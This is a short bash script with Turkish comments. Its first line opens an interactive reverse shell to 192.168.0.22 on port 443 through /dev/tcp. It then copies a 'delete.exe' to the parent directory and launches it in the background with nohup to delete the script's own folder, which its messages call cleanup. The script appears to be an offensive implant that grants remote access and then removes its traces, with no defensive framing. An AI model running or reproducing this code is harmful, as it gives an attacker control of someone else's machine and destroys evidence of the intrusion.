#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

sleep 2

# Şu anki klasör adını al (örneğin: BashExe)
CURRENT_DIR_NAME=$(basename "$PWD")

if [ -f "delete.exe" ]; then
    echo "[+] delete.exe üst dizine kopyalanıyor ve tetikleniyor..."
    
    # 1. delete.exe'yi bir üst klasöre kopyala
    cp delete.exe ../delete.exe
    
    # 2. Üst klasördeki delete.exe'yi silinecek klasör parametresiyle (CURRENT_DIR_NAME) arka planda başlat
    # nohup ve & ile Bash oturumundan bağımsızlaştırıyoruz
    nohup ../delete.exe "$CURRENT_DIR_NAME" >/dev/null 2>&1 &
    
    echo "[+] Temizlik işlemi başlatıldı, çıkış yapılıyor."
    exit 0
fi

